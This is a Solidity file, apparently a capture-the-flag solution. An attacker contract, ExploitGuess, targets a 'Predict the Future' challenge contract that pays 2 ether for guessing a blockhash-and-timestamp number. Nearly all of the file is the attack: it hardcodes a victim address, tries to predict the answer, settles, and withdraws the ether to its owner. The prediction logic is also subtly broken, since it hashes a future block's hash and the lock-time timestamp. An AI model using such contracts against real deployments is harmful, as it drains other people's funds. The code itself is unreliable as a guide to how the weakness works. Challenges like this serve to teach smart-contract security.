pragma solidity ^0.4.21;

contract ExploitGuess {
    address public victim;
    address public owner;
    uint8 public answer;
    address public contractAddress;

    function ExploitGuess() public payable{
        owner = msg.sender;
        victim = 0x82D2C036D21e969055FCb7B24283E1F1680e20D4;
        contractAddress = PredictTheFutureChallenge(victim);
    }

    function lockInGuessExploit() public payable {
        answer = uint8(keccak256(block.blockhash(block.number + 1), now)) % 10;
        PredictTheFutureChallenge(victim).lockInGuess.value(msg.value)(answer);
    }

    function settleExploit() public payable {
        require(answer == (uint8(keccak256(block.blockhash(block.number - 1), now)) % 10));
        PredictTheFutureChallenge(victim).settle();
    }

    function withdraw() public {
        require(owner == msg.sender);
        owner.transfer(address(this).balance);
    }
    
    function setVictimAddress(address addr) public {
        require(owner == msg.sender);
        victim = addr;
        contractAddress = PredictTheFutureChallenge(victim);
    }

    function() public payable{}
}

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
